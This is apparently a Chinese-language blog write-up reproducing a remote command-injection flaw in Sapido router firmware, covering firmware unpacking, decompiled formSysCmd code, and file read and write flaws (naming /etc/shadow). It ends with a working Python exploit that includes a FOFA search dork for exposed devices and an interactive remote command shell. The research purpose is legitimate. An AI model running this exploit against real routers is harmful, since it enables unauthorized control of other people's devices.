---
layout:     post                       
title:      Sapido路由器命令执行漏洞复现
subtitle:   
date:       2025-05-14          
author:     Closure                         
header-img: img/
catalog: true                         
tags:                               
    - 笔记
    - 近源
---

![ ](/img/20250514-0.png)

跟着书(物联网安全漏洞挖掘实战-异步)里的第四章做的。

```
binwalk RB-1732.bin -Me
```

递归扫描&自动解包

![ ](/img/20250514-1.png)

```
find squashfs-root* -name "syscmd.asp"
```

找到了俩syscmd.asp，cat之后

```
<html>
<! Copyright (c) Realtek Semiconductor Corp., 2003. All Rights Reserved. ->
<head>
<meta http-equiv="Content-Type" content="text/html">
<title>System Command</title>
<script>
function saveClick(){
        field = document.formSysCmd.sysCmd ;
        if(field.value.indexOf("ping")==0 && field.value.indexOf("-c") < 0){
                alert('please add "-c num" to ping command');
                return false;
        }
        if(field.value == ""){
                alert("Command can't be empty");
                field.value = field.defaultValue;
                field.focus();
                return false ;
        }
        return true;
}
</script>
</head>

<body>
<blockquote>
<h2><font color="#0000FF">System Command</font></h2>


<form action=/goform/formSysCmd method=POST name="formSysCmd">
<table border=0 width="500" cellspacing=0 cellpadding=0>
  <tr><font size=2>
 This page can be used to run target system command.
  </tr>
  <tr><hr size=1 noshade align=top></tr>
  <tr>
        <td>System Command: </td>
        <td><input type="text" name="sysCmd" value="" size="20" maxlength="50"></td>
        <td> <input type="submit" value="Apply" name="apply" onClick='return saveClick()'></td>

  </tr>
</table>
  <input type="hidden" value="/syscmd.asp" name="submit-url">
</form>
  <script language="JavaScript">
  
  </script>

  <textarea rows="15" name="msg" cols="80" wrap="virtual"><% sysCmdLog(); %></textarea>

  <p>
  <input type="button" value="Refresh" name="refresh" onClick="javascript: window.location.reload()">
  <input type="button" value="Close" name="close" onClick="javascript: window.close()"></p>
</blockquote>
</font>
</body>

</html>
```

这个页面能看出来是Realtek路由器系统中的一个前端页面页来执行系统命令，属于路由器固件中的命令注入接口。主要功能集中在构造一个表单，向 */goform/formSysCmd POST* 一个参数*sysCmd*，这个页面本身并不执行命令只是表单接口，真正执行命令的是*/goform/formSysCmd*，所以之后重点看这个。

![ ](/img/20250514-2.png)
![ ](/img/20250514-3.png)

很多低端路由器，类似Realtek和Broadcom等厂商的SDK固件中都广泛使用了一个webs这样的嵌入式 WebServer程序，特征是体积小&功能固定&运行于uClibc or musl libc库下的 Linux。在这些系统中，*/goform/* *是用来后端控制指令的分发接口，比如：*/goform/formSysCmd*：执行系统命令（常见后门）/goform/wizard_handle：设置向导处理* /goform/saveConfig*：保存配置 */goform/Reboot*：设备重启。不能算标准CGI脚本 PHP，而是嵌入在 *Web Server *的内部函数或回调函数中，如果是写在 C 语言中甚至还是通过硬编码处理的。

所以在遇到这种固件一般可以通过以下路径寻找可疑点：

1. squashfs-root/web/ 路径中：
   查找 .asp 文件中的：
   *<form action="/goform/formSysCmd">*：识别潜在漏洞入口
   *name="formSysCmd"*：标记对应字段
   *document.formSysCmd.sysCmd*：JavaScript 中引用字段
2. *squashfs-root/bin/webs* 或其他ELF文件中：
   使用strings、binwalk、IDA/Ghidra 等工具搜索关键函数：
   *system, popen, exec, eval, strcpy, sprintf*（危险函数）
   *formSysCmd, goform*（接口函数）

在 webs 中找到

```
int formSysCmd(request) {
   char *cmd = websGetVar(request, "sysCmd", NULL);
   system(cmd);
}
```

并且这里的纯前端校验也没有对命令进行任何类型过滤，也没有权限检查。

```
<textarea rows="15" name="msg" cols="80" wrap="virtual"><% sysCmdLog(); %></textarea>
```

后端将sysCmd参数直接传入system，输出会回显在这个 textarea 中。

*grep -rn "formSysCmd" squashfs-root**

```
squashfs-root/web/syscmd.asp:8:        field = document.formSysCmd.sysCmd ;
squashfs-root/web/syscmd.asp:29:<form action=/goform/formSysCmd method=POST name="formSysCmd">
squashfs-root/web/obama.asp:8:        field = document.formSysCmd.sysCmd ;
squashfs-root/web/obama.asp:45:<form action=/goform/formSysCmd method=POST name="formSysCmd">
squashfs-root/web/obama.asp:71:  <form method="post" action="goform/formSysCmd" enctype="multipart/form-data" name="writefile">
squashfs-root/web/obama.asp:83:  <form action="/goform/formSysCmd" method=POST name="readfile">
grep: squashfs-root/bin/webs: binary file matches
squashfs-root-0/web/syscmd.asp:8:        field = document.formSysCmd.sysCmd ;
squashfs-root-0/web/syscmd.asp:29:<form action=/goform/formSysCmd method=POST name="formSysCmd">
squashfs-root-0/web/obama.asp:8:        field = document.formSysCmd.sysCmd ;
squashfs-root-0/web/obama.asp:45:<form action=/goform/formSysCmd method=POST name="formSysCmd">
squashfs-root-0/web/obama.asp:71:  <form method="post" action="goform/formSysCmd" enctype="multipart/form-data" name="writefile">
squashfs-root-0/web/obama.asp:83:  <form action="/goform/formSysCmd" method=POST name="readfile">
```

排除掉不处理命令执行的静态文件，关注*squashfs-root/bin/webs*，给他提出来放IDAPRO。

![ ](/img/20250514-4.png)

全局搜索之前提到的formSysCmd，发现两个，反编译看一下伪代码
![ ](/img/20250514-5.png)
![ ](/img/20250514-6.png)
![ ](/img/20250514-61.png)

```
int __fastcall formSysCmd(int a1)
{
  int Var; // $s4
  const char *v3; // $s1
  _BYTE *v4; // $s5
  int v5; // $s6
  const char *v6; // $s3
  _BYTE *v7; // $s7
  int v8; // $v0
  _DWORD *v9; // $s0
  int v10; // $a0
  const char *v11; // $a1
  int v12; // $v0
  int v13; // $s1
  void (__fastcall *v14)(int, _DWORD *); // $t9
  _BYTE *v15; // $a0
  _BYTE *v16; // $a3
  int v17; // $a0
  int v18; // $v0
  char v20[104]; // [sp+20h] [-68h] BYREF

  Var = websGetVar(a1, "submit-url", &dword_47F498);
  v3 = (const char *)websGetVar(a1, "sysCmd", &dword_47F498);
  v4 = (_BYTE *)websGetVar(a1, "writeData", &dword_47F498);
  v5 = websGetVar(a1, "filename", &dword_47F498);
  v6 = (const char *)websGetVar(a1, "fpath", &dword_47F498);
  v7 = (_BYTE *)websGetVar(a1, "readfile", &dword_47F498);
  if ( *v3 )
  {
    snprintf(v20, 100, "%s 2>&1 > %s", v3, "/tmp/syscmd.log");
    system(v20);
  }
  if ( *v4 )
  {
    strcpy(v20, v6);
    strcat(v20, v5);
    v8 = fopen(v20, "w");
    v9 = (_DWORD *)v8;
    if ( !v8 )
    {
      printf("Open %s fail.\n", v20);
      v10 = a1;
      v11 = (const char *)Var;
      return websRedirect(v10, v11);
    }
    v13 = 0;
    v12 = fileno(v8);
    fchmod(v12, 511);
    if ( *(int *)(a1 + 240) > 0 )
    {
      while ( 1 )
      {
        v14 = (void (__fastcall *)(int, _DWORD *))&fputc;
        if ( !v9[13] )
          break;
        v15 = (_BYTE *)v9[4];
        v14 = (void (__fastcall *)(int, _DWORD *))&_fputc_unlocked;
        v16 = (_BYTE *)(*(_DWORD *)(a1 + 204) + v13);
        if ( (unsigned int)v15 >= v9[7] )
        {
          v17 = (char)*v16;
LABEL_12:
          v14(v17, v9);
          goto LABEL_13;
        }
        *v15 = *v16;
        v9[4] = v15 + 1;
LABEL_13:
        if ( ++v13 >= *(_DWORD *)(a1 + 240) )
          goto LABEL_14;
      }
      v17 = *(char *)(*(_DWORD *)(a1 + 204) + v13);
      goto LABEL_12;
    }
LABEL_14:
    fclose(v9);
    printf("Write to %s\n", v20);
    strcpy(&writepath, v6);
  }
  if ( *v7 && (v18 = fopen(v6, "r")) != 0 )
  {
    fclose(v18);
    sprintf(v20, "cat %s > /web/obama.dat", v6);
    system(v20);
    usleep(10000);
    v10 = a1;
    v11 = "/obama.dat";
  }
  else
  {
    v10 = a1;
    v11 = (const char *)Var;
  }
  return websRedirect(v10, v11);
}
```

读代码很明显了。

**命令注入**

代码中的*sysCmd*参数由*websGetVar*获取传递给*snprintf*构建命令 system(v20)执行命令。如果攻击者能够*sysCmd*参数中注入恶意命令就可以执行任意系统命令。(向 URL 发送类似 http://target/syscmd.htm?sysCmd=ls%20-la 的请求来执行命令)

```
v3 = (const char *)websGetVar(a1, "sysCmd", &dword_47F498);
if ( *v3 ) {
    snprintf(v20, 100, "%s 2>&1 > %s", v3, "/tmp/syscmd.log");
    system(v20);
}
```

**任意文件写入**

用户控制的路径拼接成 v20,没有检查目录遍历和路径注入。

```
v4 = (_BYTE *)websGetVar(a1, "writeData", &dword_47F498);
v5 = websGetVar(a1, "filename", &dword_47F498);
v6 = (const char *)websGetVar(a1, "fpath", &dword_47F498);
if ( *v4 ) {
    strcpy(v20, v6);
    strcat(v20, v5);
    FILE *f = fopen(v20, "w");
    ...
    fwrite(writeData, ...);
}
```

**信息读取**

允许用户通过readfile 和 fpath读取敏感文件。（ /etc/shadow 或 /proc/self/environ）

```
v7 = (_BYTE *)websGetVar(a1, "readfile", &dword_47F498);
if ( *v7 && (v18 = fopen(v6, "r")) != 0 ) {
    sprintf(v20, "cat %s > /web/obama.dat", v6);
    system(v20);
    return websRedirect(a1, "/obama.dat");
}
```

### 复现

![ ](/img/20250514-7.png)
![ ](/img/20250514-8.png)

### POC

```
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#fofa dork: app="Sapido-路由器"
'''
Affect versions:
BR270n-v2.1.03
BRC76n-v2.1.03
GR297-v2.1.3
RB1732-v2.0.43
'''
#Author 9527

import requests
import sys
import os
import platform
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def Checking():
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
	}
	try:
		Url = target + "syscmd.htm"
		response = requests.get(url = Url,headers = headers,verify = False,timeout = 10)
		if(response.status_code == 200 and 'System Command' in response.text):
			print("[+] Target is vuln")
			return True
		else:
			print("[-] Target is not vuln")
			response.close()
			return False
	except Exception as e:
		print("[-] Server error")
		response.close()
		return False

def Exploit():
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type": "application/x-www-form-urlencoded",
			"Origin": target,
			"Referer": target + "syscmd.htm"
		}
	while True:
		command = input('# ')
		if(command == 'cls'):
			if(Os_Name == 'Windows'):
				os.system("cls")
				continue
			if(Os_Name == 'Linux'):
				os.system('clear')
				continue
			else:
				pass
		if(command == 'exit'):
			print("[!] User exit")
			response.close()
			sys.exit()
		if(command == 'help'):
			print("cls: clean the screen")
			print("exit: exit this program")
			continue
		data = "sysCmd=" + command + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg=boa.conf%0D%0Amime.types%0D%0A"
		Url = target + "boafrm/formSysCmd"
		try:
			response = requests.post(url = Url,data = data,headers = headers,verify = False,timeout = 10)
			if(response.status_code == 200):
				#print(response.text)
				soup = BeautifulSoup(response.text,'html.parser')
				CmdShow = soup.textarea.text
				print(CmdShow)
			else:
				print("[-] Failed")
				response.close()
				sys.exit()
		except Exception as e:
			response.close()
			print("[-] Some error happend to you")

if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("|-----------------------------------------------------------------------------------|")
		print("|                                Sapido-router Rce                                  |")
		print("|                       UseAge: python3 exploit.py target                           |")
		print("|                   Example: python3 exploit.py https://192.168.1.2/                |")
		print("|                                [!] Learning only                                  |")
		print("|___________________________________________________________________________________|")
		sys.exit()
	target = sys.argv[1]
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	while Checking() is True:
		Os_Name = platform.system()
		Exploit()
```



